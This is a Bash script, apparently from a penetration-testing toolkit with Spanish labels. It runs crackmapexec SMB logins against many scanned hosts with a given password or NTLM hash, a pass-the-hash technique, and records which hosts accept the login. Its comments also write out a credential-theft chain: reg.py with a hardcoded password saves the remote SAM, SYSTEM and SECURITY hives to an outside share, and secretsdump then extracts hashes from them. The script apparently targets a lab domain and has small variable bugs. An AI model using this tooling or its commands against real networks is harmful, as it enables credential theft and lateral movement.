#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org
THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
RESET='\e[0m'

#iptables -I INPUT -p icmp --icmp-type 8 -j DROP

while getopts ":u:h:p:f:o:" OPTIONS
do
            case $OPTIONS in            
            u)     USUARIO=$OPTARG;;
            h)     HASH=$OPTARG;;
            p)     PASSWORD=$OPTARG;;
            f)     FILE=$OPTARG;;            
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

USUARIO=${USUARIO:=NULL}
HASH=${HASH:=NULL}
PASSWORD=${PASSWORD:=NULL}
FILE=${FILE:=NULL}

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	find .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert-data.py
	mv .enumeracion/* .enumeracion2 2>/dev/null
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
	}
	

function print_ascii_art {
cat << "EOF"

╦  ┌─┐┌─┐┌─┐┬    ┌─┐┌┬┐┌┬┐┬┌┐┌  ┌─┐┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐
║  │ ││  ├─┤│    ├─┤ │││││││││  │  ├─┤├┤ │  ├┴┐├┤ ├┬┘
╩═╝└─┘└─┘┴ ┴┴─┘  ┴ ┴─┴┘┴ ┴┴┘└┘  └─┘┴ ┴└─┘└─┘┴ ┴└─┘┴└─

					daniel.torres@owasp.org
					https://github.com/DanielTorres1

EOF
}


print_ascii_art

if [ $USUARIO = NULL ] ; then
echo "|              														 			"
echo "| USO: local-admin-checker.sh -u [usuario] -h [hash] -p [password] -f [file]"
echo "|																		 			"
echo ""
exit
fi

#1) smbserver.py -smb2support share .
#2) reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.132\share'
#   reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SAM' -o '\\192.168.56.132\share'
#   reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.132\share'
#3) secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
#   secretsdump -security SECURITY.save -system SYSTEM.save LOCAL # DCC2 (Domain Cached credentials 2 ) hashcat mode 2100
echo -e "$OKBLUE Probando con usuario: $USUARIO  y hash $HASH $RESET"
######################

  for ip in $(ls .enumeracion2_archived| grep 'crackmapexec' | cut -d "_" -f1); do
			echo -e "[+] $OKBLUE Testeando $ip .. $RESET"
			if [ -z $HASH ] ; then
			#echo "PASSWORD $PASSWORD"				
				echo "Usando password $PASSWORD"
				crackmapexec smb $ip -u $USUARIO -p $PASSWORD --local-auth  | tee logs/vulnerabilidades/"$ip"_smb_logeoRemoto1.txt #local
				crackmapexec smb $ip -u $USUARIO -p $PASSWORD  | tee logs/vulnerabilidades/"$ip"_smb_logeoRemoto2.txt	#dominio
			else
				echo "Usando HASH $HASH"
				echo "crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth "
				crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth  | tee logs/vulnerabilidades/"$ip"_smb_logeoRemoto1.txt #local
				crackmapexec smb $ip -u $USUARIO -H $HASH  | tee logs/vulnerabilidades/"$ip"_smb_logeoRemoto2.txt #dominio					
			fi
			
			grep -qai '+' logs/vulnerabilidades/"$ip"_smb_logeoRemoto1.txt
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then						
				echo -e "\t$OKRED[i] Logeo remoto habilitado $RESET"
				if [ -z $HASH ] ; then
					echo -e "Usuario:$USUARIO Pasword:$password (local)" >> .vulnerabilidades/"$ip"_smb_logeoRemoto.txt
				else
					echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (local)" >> .vulnerabilidades/"$ip"_smb_logeoRemoto.txt
				fi			
			fi	

			grep -qai '+' logs/vulnerabilidades/"$ip"_smb_logeoRemoto2.txt
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then						
				echo -e "\t$OKRED[i] Logeo remoto habilitado $RESET"
				if [ -z $HASH ] ; then
					echo -e "Usuario:$USUARIO Pasword:$password (dominio)" >> .vulnerabilidades/"$ip"_smb_logeoRemoto.txt
				else
					echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (dominio)" >> .vulnerabilidades/"$ip"_smb_logeoRemoto.txt
				fi			
			fi	
					
	done

insert_data



